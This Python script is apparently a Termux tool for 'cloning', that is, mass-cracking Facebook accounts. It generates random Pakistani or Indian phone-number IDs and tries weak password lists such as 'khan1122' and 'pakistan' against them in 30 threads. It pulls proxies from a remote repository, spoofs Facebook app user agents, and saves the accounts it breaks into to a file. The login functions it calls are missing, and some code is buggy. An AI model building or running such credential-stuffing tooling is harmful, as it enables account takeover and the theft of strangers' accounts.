fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python ZEESHU.py')
	
print('[•] TOOL LOADING')


try:
	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
	open('proxies.txt','w').write(proxies)
except Exception as e:
	print('\x1b[1;95m[√] LOADING...')
	
proxies=open('proxies.txt','r').read().splitlines()


android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
	for line in xx:
		android_models.append(line)
except:pass

usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass

gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c=f' en-us; {str(gt)}'
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for agent in range(10000):
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/533.1'
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(fullagnt)
rug=[]
for nt in range(10000):
	rr=random.randint
	aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	rx=random.randrange(1, 999)
	xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
	rug.append(xx)
ruz=[]
for mtc in range(10000):
	rr=random.randint
	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
	ruz.append(xd)
	
#new ua
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
        
def ua_api():
	rhm = str(random.randint(100,400))
	fblc = random.choice(['en_US','en_Qaau_US','en_GB','en_PK','ru_RU','de_DE','th_TH','en_BD','en_IN','en_AF'])
	fbdv = random.choice(["Redmi Note 11 Pro", "Redmi Note 11", "Redmi 10", "Redmi 10 Pro", "Redmi Note 10 Pro", "Redmi Note 10", "Redmi 9T", "Redmi 9", "Redmi 9A", "Redmi K40", "Redmi K40 Pro", "Redmi K30", "Redmi K30 Pro", "Redmi Note 9 Pro", "Redmi Note 9", "Redmi 8A", "Redmi 8", "Redmi 7A", "Redmi 7", "Redmi 6A", "Redmi 6", "Redmi 5A", "Redmi 5", "Redmi 4A", "Redmi 4", "Redmi 3", "Redmi 2", "Redmi 1S", "Redmi Note 8", "Redmi Note 7", "Redmi Note 6 Pro", "Redmi Note 5 Pro", "Redmi Note 4", "Redmi Note 3", "Redmi S2", "Redmi Y2", "Redmi Y3", "Redmi Y1", "Redmi Y1 Lite", "Redmi Go", "Redmi 8A Dual", "Redmi 6 Pro", "Redmi Note 5A", "Redmi Note 5A Prime", "Redmi 5 Plus", "Redmi 5X", "Redmi 4X", "Redmi 4 Prime", "Redmi 4 Pro", "Redmi 4X", "Redmi 3S", "Redmi 3X", "Redmi 3 Pro", "Redmi 3S Prime", "Redmi 3", "Redmi Note 2", "Redmi Note", "Redmi 2A", "Redmi 1", "Redmi Pro", "Redmi Note 2 Prime", "Redmi Note 3 Pro", "Redmi Note 3", "Redmi 4A", "Redmi 5A", "Redmi Note 5", "Redmi 7A", "Redmi 8A", "Redmi Note 8 Pro", "Redmi Note 8T", "Redmi Note 8T", "Redmi Note 9T", "Redmi Note 9T", "Redmi Note 9 Pro", "Redmi Note 9 Pro Max", "Redmi Note 9", "Redmi Note 9S", "Redmi Note 9T", "Redmi Note 9", "Redmi 9C", "Redmi 9A", "Redmi 9A", "Redmi 9", "Redmi 9 Prime", "Redmi 9", "Redmi 10", "Redmi 10 Prime", "Redmi 10", "Redmi K30", "Redmi K30 5G", "Redmi K30 5G Racing", "Redmi K30 Pro", "Redmi K30 Ultra", "Redmi K30 Pro Zoom", "Redmi K30S", "Redmi K40", "Redmi K40 Pro", "Redmi K40 Pro+", "Redmi K40 Gaming Edition", "Redmi K50", "Redmi K50 Pro", "Redmi K50 Pro+"])
	#fbdv = random.choice(["SM-G930F", "SM-G950U", "SM-G965W", "SM-N9600", "SM-G975F", "SM-G988B", "SM-G991U", "SM-A715F", "SM-J730F", "SM-T720", "SM-T870", "SM-G7102", "SM-A515F", "SM-N950F", "SM-G930T", "SM-J260G", "SM-A750F", "SM-T590", "SM-G960U", "SM-N920C", "SM-G532F", "SM-A205G", "SM-J701F", "SM-A505F", "SM-T510", "SM-G610F", "SM-G935F", "SM-A325F", "SM-A107F", "SM-A217F", "SM-T580", "SM-G770F", "SM-G925F", "SM-M215F", "SM-A526B", "SM-G903F", "SM-J320F", "SM-A908B", "SM-T835", "SM-A515U", "SM-G7105", "SM-J415F", "SM-A326B", "SM-N770F", "SM-A207F", "SM-T725", "SM-G900F", "SM-A526U", "SM-A102U", "SM-A310F", "SM-T720", "SM-J500F", "SM-G610M", "SM-A217M", "SM-T230", "SM-G7102", "SM-N950U", "SM-A515U1", "SM-J330F", "SM-T830", "SM-G955F", "SM-J600G", "SM-A217M", "SM-A300F", "SM-A520F", "SM-N960U", "SM-A015M", "SM-A107M", "SM-T595", "SM-J500H", "SM-G530H", "SM-A025F", "SM-J710F", "SM-A908B", "SM-T515", "SM-N975F", "SM-A320FL", "SM-J250F", "SM-A526B", "SM-G930P", "SM-A530F", "SM-A715F", "SM-G925T", "SM-G977U", "SM-A205F", "SM-T580", "SM-G600F", "SM-A510F", "SM-A013M", "SM-J415F", "SM-T295", "SM-G960F", "SM-J701F", "SM-G935T", "SM-A015M", "SM-A305F", "SM-G532G", "SM-T825", "SM-A908B", "SM-J260M", "SM-N770F", "SM-A520F", "SM-A305G", "SM-T377A", "SM-G965F", "SM-A526U", "SM-G950F", "SM-A127F", "SM-T380", "SM-A217F", "SM-A326B", "SM-A326BR", "SM-N920I", "SM-A705F", "SM-J730GM", "SM-A207M", "SM-T510", "SM-G920F", "SM-G7105", "SM-J320M", "SM-N960F", "SM-A217M", "SM-G900H", "SM-A516U", "SM-A526U1", "SM-G7102", "SM-A715F", "SM-A526B", "SM-G900F", "SM-T835", "SM-A515U", "SM-J320F", "SM-G7105", "SM-N770F", "SM-T595", "SM-J415F", "SM-N950U", "SM-A217M", "SM-T230", "SM-A908B", "SM-A515U1", "SM-G610M", "SM-J330F", "SM-A517B", "SM-A300F", "SM-A520F", "SM-N960U", "SM-A015M", "SM-A107M", "SM-T595", "SM-G530H", "SM-A025F", "SM-J710F", "SM-A908B", "SM-T515", "SM-N975F", "SM-A320FL", "SM-J250F", "SM-A526B", "SM-G930P", "SM-A530F", "SM-A715F", "SM-G925T", "SM-G977U", "SM-A205F", "SM-T580", "SM-G600F", "SM-A510F", "SM-A013M", "SM-J415F", "SM-T295", "SM-G960F", "SM-J701F", "SM-G935T", "SM-A015M", "SM-A305F", "SM-G532G", "SM-T825", "SM-A908B", "SM-J260M", "SM-N770F", "SM-A520F", "SM-A305G", "SM-T377A", "SM-G965F", "SM-A526U", "SM-G950F", "SM-A127F", "SM-T380", "SM-A217F", "SM-A326B", "SM-A326BR", "SM-N920I", "SM-A705F", "SM-J730GM", "SM-A207M", "SM-T510", "SM-G920F", "SM-G7105", "SM-J320M", "SM-N960F", "SM-A217M", "SM-G900H", "SM-A516U", "SM-A526U1", "SM-G7102", "SM-A715F", "SM-A526B", "SM-G900F", "SM-T835", "SM-A515U", "SM-J320F", "SM-G7105", "SM-N770F", "SM-T595", "SM-J415F", "SM-N950U", "SM-A217M", "SM-T230", "SM-A908B", "SM-A515U1", "SM-G610M", "SM-J330F", "SM-A517B", "SM-A300F", "SM-A520F", "SM-N960U", "SM-A015M", "SM-A107M", "SM-T595", "SM-G530H", "SM-A025F", "SM-J710F", "SM-A908B", "SM-T515", "SM-N975F", "SM-A320FL", "SM-J250F", "SM-A526B", "SM-G930P", "SM-A530F", "SM-A715F", "SM-G925T", "SM-G977U", "SM-A205F", "SM-T580", "SM-G600F", "SM-A510F", "SM-A013M", "SM-J415F", "SM-T295", "SM-G960F", "SM-J701F", "SM-G935T", "SM-A015M", "SM-A305F", "SM-G532G", "SM-T825", "SM-A908B", "SM-J260M", "SM-N770F", "SM-A520F", "SM-A305G", "SM-T377A", "SM-G965F", "SM-A526U", "SM-G950F", "SM-A127F", "SM-T380", "SM-A217F", "SM-A326B", "SM-A326BR", "SM-N920I", "SM-A705F", "SM-J730GM", "SM-A207M", "SM-T510", "SM-G920F", "SM-G7105", "SM-J320M", "SM-N960F", "SM-A217M", "SM-G900H", "SM-A516U", "SM-A526U1", "SM-G7102", "SM-A715F", "SM-A526B", "SM-G900F", "SM-T835", "SM-A515U", "SM-J320F", "SM-G7105", "SM-N770F", "SM-T595", "SM-J415F", "SM-N950U", "SM-A217M", "SM-T230", "SM-A908B", "SM-A515U1", "SM-G610M", "SM-J330F", "SM-A517B", "SM-A300F", "SM-A520F", "SM-N960U", "SM-A015M", "SM-A107M", "SM-T595", "SM-G530H", "SM-A025F", "SM-J710F", "SM-A908B", "SM-T515", "SM-N975F", "SM-A320FL", "SM-J250F", "SM-A526B", "SM-G930P", "SM-A530F", "SM-A715F", "SM-G925T", "SM-G977U", "SM-A205F", "SM-T580", "SM-G600F", "SM-A510F", "SM-A013M", "SM-J415F", "SM-T295", "SM-G960F", "SM-J701F", "SM-G935T", "SM-A015M", "SM-A305F", "SM-G532G", "SM-T825", "SM-A908B", "SM-J260M", "SM-N770F", "SM-A520F", "SM-A305G", "SM-T377A", "SM-G965F", "SM-A526U", "SM-G950F", "SM-A127F", "SM-T380", "SM-A217F", "SM-A326B", "SM-A326BR", "SM-N920I", "SM-A705F", "SM-J730GM", "SM-A207M", "SM-T510", "SM-G920F", "SM-G7105", "SM-J320M", "SM-N960F", "SM-A217M", "SM-G900H", "SM-A516U", "SM-A526U1", "SM-G7102", "SM-A715F", "SM-A526B", "SM-G900F", "SM-T835", "SM-A515U", "SM-J320F", "SM-G7105", "SM-N770F", "SM-T595", "SM-J415F", "SM-N950U", "SM-A217M", "SM-T230", "SM-A908B", "SM-A515U1", "SM-G610M", "SM-J330F", "SM-A517B", "SM-A300F", "SM-A520F", "SM-N960U", "SM-A015M", "SM-A107M", "SM-T595", "SM-G530H", "SM-A025F", "SM-J710F", "SM-A908B", "SM-T515", "SM-N975F", "SM-A320FL", "SM-J250F", "SM-A526B", "SM-G930P", "SM-A530F", "SM-A715F", "SM-G925T", "SM-G977U", "SM-A205F", "SM-T580", "SM-G600F", "SM-A510F", "SM-A013M", "SM-J415F", "SM-T295", "SM-G960F", "SM-J701F", "SM-G935T", "SM-A015M", "SM-A305F", "SM-G532G", "SM-T825", "SM-A908B", "SM-J260M", "SM-N770F", "SM-A520F", "SM-A305G", "SM-T377A", "SM-G965F", "SM-A526U", "SM-G950F", "SM-A127F", "SM-T380", "SM-A217F", "SM-A326B", "SM-A326BR", "SM-N920I", "SM-A705F", "SM-J730GM", "SM-A207M", "SM-T510", "SM-G920F", "SM-G7105", "SM-J320M", "SM-N960F", "SM-A217M", "SM-G900H", "SM-A516U", "SM-A526U1", "SM-G7102", "SM-A715F", "SM-A526B", "SM-G900F", "SM-T835", "SM-A515U", "SM-J320F", "SM-G7105", "SM-N770F", "SM-T595", "SM-J415F", "SM-N950U", "SM-A217M", "SM-T230", "SM-A908B", "SM-A515U1", "SM-G610M", "SM-J330F", "SM-A517B", "SM-A300F"])
	fbcr = random.choice(['Telekom.de','Telekom HU','halebop','Meteor','movistar','VIRGIN','TELKOMSEL','Verizon Wireless','EMOVIL','VIVA','TURKCELL','ROGERS','Tesco Mobile','TIGO','T-Mobile','AT&amp-T','Telstra','mt:s','YES_OPTUS','Vodafone','Cellcom','Telenor','AIS','Bezlimit','Zong','Jazz'])
	return (f"[FBAN/Orca-Android;FBAV/"+str(random.randint(111, 383))+".0.0.27."+str(random.randint(111, 383))+";FBBV/"+str(random.randint(11111111, 38333333))+";FBLC/"+fblc+";FBRV/"+str(random.randint(111111111, 383333333))+";FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.orca;FBDV/"+fbdv+";FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1422};]")

logo=("""\033[1;91m



  /$$$$$$  /$$   /$$  /$$$$$$  /$$   /$$ /$$$$$$ /$$$$$$$ 
 /$$__  $$| $$  | $$ /$$__  $$| $$  /$$/|_  $$_/| $$__  $$
| $$  \__/| $$  | $$| $$  \ $$| $$ /$$/   | $$  | $$  \ $$
|  $$$$$$ | $$$$$$$$| $$$$$$$$| $$$$$/    | $$  | $$$$$$$/
 \____  $$| $$__  $$| $$__  $$| $$  $$    | $$  | $$__  $$
 /$$  \ $$| $$  | $$| $$  | $$| $$\  $$   | $$  | $$  \ $$
|  $$$$$$/| $$  | $$| $$  | $$| $$ \  $$ /$$$$$$| $$  | $$
 \______/ |__/  |__/|__/  |__/|__/  \__/|______/|__/  |__/
                                                          
                                                          
                                                          

                                                                               
                                                                                   
                                                                                   

                                                                     

\033[1;37m--------------------------------------------------
 [\033[1;32m*\033[1;37m] Author   : MR SHAKIR
 [\033[1;32m*\033[1;37m] Facebook : SHAKIR XWD
 [\033[1;32m*\033[1;37m] Tool     : FREE
 [\033[1;32m*\033[1;37m] Version  : 0.0.9
\033[1;37m--------------------------------------------------
 [\033[1;32m*\033[1;37m]\033[1;33mYOUR ACCOUNTs ARE SAVE IN:\033[1;32m/sdcard/SHAKIR-OK.txt\033[1;37m
\033[1;37m--------------------------------------------------""")
def linex():
	print('\033[1;37m--------------------------------------------------')
def clear():
	os.system('clear')
	print(logo)
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s [%s•%s] %sActive Apks & Web Not Found %s		'%(N,H,N,H,N))
	else:
		print(f'\r{A} [•]%s Active Apks & Web 👇 '%(H))
		for i in range(len(game)):
			print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s [%s•%s] %sExpired Apks & Web Not Found %s		'%(N,M,N,M,N))
	else:
		print(f'\r{A} [•]%s Expired Apks & Web 👇 '%(M))
		for i in range(len(game)):
			print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]



def menu():
			clear()
		#	linex()
			print(' [1] File cloning\n [2] Random cloning\n [3] gmail cloning \n [4] INDIA RANDOM  \n [0] Exit menu')
			linex()
			xd=input(' Choose an option: ')
		#	os.system('xdg-open https://www.facebook.com/dr.paigham')
			if xd in ['1','01']:
				clear()
				print(' Put file example:  /sdcard/File.txt  etc..')
				linex()
				file = input(' Put file path\033[1;37m: ')
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
					print(' File location not found ')
					time.sleep(1)
					menu()
				clear()
				print(' All method working ')
				linex()
				print(' [1] METHOD (NEW ID)')
				print(' [2] METHOD (MIX)')
				linex()
				mthd=input(' Choose: ')
				linex()
				plist = []
				try:
					ps_limit = int(input(' How many passwords do you want to add ? '))
				except:
					ps_limit =1
				clear()
				print('\033[1;32m exp: first last,firtslast,first123')
				linex()
				for i in range(ps_limit):
					plist.append(input(f' Put password {i+1}: '))
				clear()
				print(' Do you went show cp account? (y/n): ')
				linex()
				cx=input(' Choose: ')
				if cx in ['y','Y','yes','Yes','1']:
					pcp.append('y')
				else:
					pcp.append('n')
				with tred(max_workers=30) as crack_submit:
					clear()
					total_ids = str(len(fo))
					print(' Total account ids : \033[1;32m'+total_ids+f' ')
					print(' \033[1;37mThe process is running in the background')
					linex()
					for user in fo:
						ids,names = user.split('|')
						passlist = plist
						if mthd in ['1','01']:
							crack_submit.submit(api1,ids,names,passlist)
						elif mthd in ['2','02']:
							crack_submit.submit(api2,ids,names,passlist)
						
				print('\033[1;37m')
				linex()
				print(' The process has completed')
				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
				linex()
				input(' Press enter to back ')
				os.system('python ZEESHU.py')
			elif xd in ['2','02']:
				    pak() 
            
			elif xd in ['3','03']:
				gmail()
				#create()
				#dz._login()
				exit()
			elif xd in ['4','04']:
				
				ind()
			elif xd in ['0','00']:
				exit(' Thanks for use 🥰 ')
			else:
				exit(' Option not found in menu...')
		
def pak():
		user=[]
		clear()
		print('\033[1;35m Code example: 0306,0315,0335,0345')
		code = input('\033[1;37m put code: ')
		try:
			limit = int(input('\033[1;35m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
		except ValueError:
			limit = 5000
		clear()
		print(' [1] METHOD 1')
		linex()
		mthd = input(' Choose: ')
		clear()
		print(' [1] Number + khan password')
		linex()
		pcs = input(' [?] Select: ')
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as ZEESHU:	
			clear()
			tl = str(len(user))
			print(' Total ids : \033[1;32m'+tl+f' ')
			print(f'\033[1;37m Choice code  :\033[1;32m '+code)
			print(' \033[1;37mThe process is running in the background')
			linex()
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
				if mthd in ['1','01']:
					ZEESHU.submit(ZEESHU4,ids,passlist)
					
def ind():
		user=[]
		clear()
		print('\033[1;35m Code example: 91963, 91930, 91969')
		code = input('\033[1;37m put code: ')
		try:
			limit = int(input('\033[1;35m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
		except ValueError:
			limit = 5000
		clear()
		print(' [1] METHOD 1')
		linex()
		mthd = input(' Choose: ')
		clear()
		print(' [1] Number + india password')
		linex()
		pcs = input(' [?] Select: ')
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as ZEESHU:	
			clear()
			tl = str(len(user))
			print(' Total ids : \033[1;32m'+tl+f' ')
			print(f'\033[1;37m Choice code  :\033[1;32m '+code)
			print(' \033[1;37mThe process is running in the background')
			linex()
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'57273200','59039200','57575751']
				if mthd in ['1','01']:
					ZEESHU.submit(ZEESHU4,ids,passlist)
				
		print('\033[1;37m')
		linex()
		print(' The process has completed')
